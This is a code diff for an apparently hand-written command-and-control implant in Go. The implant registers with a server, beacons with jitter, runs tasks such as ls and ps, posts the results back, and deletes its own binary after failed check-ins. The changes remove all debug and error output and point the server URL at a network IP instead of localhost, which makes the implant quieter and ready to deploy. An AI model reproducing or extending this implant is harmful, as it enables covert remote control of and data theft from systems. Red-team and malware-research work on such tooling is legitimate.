@@ -80,10 +80,8 @@ func FileTransferShipper(serverUrl string, taskData map[string]interface{}, resu
 		Args:      encodedArgs,
 		Results:   encodedOutput,
 	}
-	_, err := PostJson(serverUrl, result)
-	if err != nil {
-		fmt.Println("Error posting task result:", err)
-	}
+	_, _ = PostJson(serverUrl, result)
+
 }
 
 func DataShipper(serverUrl string, taskData map[string]interface{}, results string) {
@@ -97,10 +95,8 @@ func DataShipper(serverUrl string, taskData map[string]interface{}, results stri
 		Args:      encodedArgs,
 		Results:   encodedOutput,
 	}
-	_, err := PostJson(serverUrl, result)
-	if err != nil {
-		fmt.Println("Error posting task result:", err)
-	}
+	_, _ = PostJson(serverUrl, result)
+
 }
 
 func PsHandler(serverUrl string, taskData map[string]interface{}) {
@@ -172,13 +168,10 @@ func ParseTasks(serverUrl string, tasking string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	fmt.Println(tasks)
 
 	for _, taskData := range tasks {
 		url := fmt.Sprintf("%s/results/%s", serverUrl, taskData["session"])
-		fmt.Printf("Task ID: %v\n", taskData["id"])
-		fmt.Printf("Task: %v\n", taskData["task"])
-		fmt.Printf("Args: %v\n", taskData["args"])
+
 		if taskData["task"] == "ls" {
 			LsHandler(url, taskData)
 		} else if taskData["task"] == "ps" {
@@ -206,39 +199,31 @@ func ParseTasks(serverUrl string, tasking string) (string, error) {
 func TerminateImplant() {
 	exePath, err := os.Executable()
 	if err != nil {
-		fmt.Printf("Failed to get executable path: %v\n", err)
 		os.Exit(3)
 	}
 
 	if _, err := os.Stat(exePath); err == nil {
 		err := os.Remove(exePath)
 		if err != nil {
-			fmt.Printf("Error removing implant file: %v\n", err)
 			os.Exit(2)
 		}
-		fmt.Printf("Implant file %s removed successfully\n", exePath)
 		os.Exit(1)
 	}
-
 	// Nothing on disk, just memory
 	os.Exit(0)
 }
 
 func main() {
-	fmt.Println("Agent started")
 
 	retryCounter := 0
-	serverUrl := "http://127.0.0.1:8000"
+	serverUrl := "http://192.168.15.172:8000"
 
 	initialInfo := GatherInfo()
 
 	// register with server
-	resp, err := PostJson(serverUrl+"/implants/", initialInfo)
+	_, err := PostJson(serverUrl+"/implants/", initialInfo)
 	if err != nil {
 		panic(err)
-	}
-	if resp != 200 {
-		fmt.Printf("Response: %v\n", resp)
 	}
 
 	// listen for sigterm and sigint (testing only)
@@ -247,12 +232,10 @@ func main() {
 	for {
 		nextInterval := RandomJitter(callbackTimer.Callback_freq, callbackTimer.Jitter)
 		timer := time.NewTimer(nextInterval)
-		fmt.Printf("Next check-in in %s\n", nextInterval)
 
 		<-timer.C
 		resp, err := CheckIn(serverUrl, initialInfo.Session)
 		if err != nil {
-			fmt.Printf("Error checking in: %v\n", err)
 			retryCounter += 1
 			if retryCounter >= callbackTimer.SelfTerminate {
 				TerminateImplant()
@@ -260,7 +243,6 @@ func main() {
 			continue
 		}
 		if resp != 200 && resp != 301 {
-			fmt.Printf("Unexpected response: %v\n", resp)
 			retryCounter += 1
 			if retryCounter >= callbackTimer.SelfTerminate {
 				TerminateImplant()
@@ -271,13 +253,11 @@ func main() {
 			// we have tasking
 			tasking, err := FetchTasking(serverUrl, initialInfo.Session)
 			if err != nil {
-				fmt.Printf("Error fetching tasking: %v\n", err)
 			} else {
 				ParseTasks(serverUrl, tasking)
 			}
 			continue
 		}
-		fmt.Println("Check-in fired")
 		retryCounter = 0
 		timer.Stop()
 	}
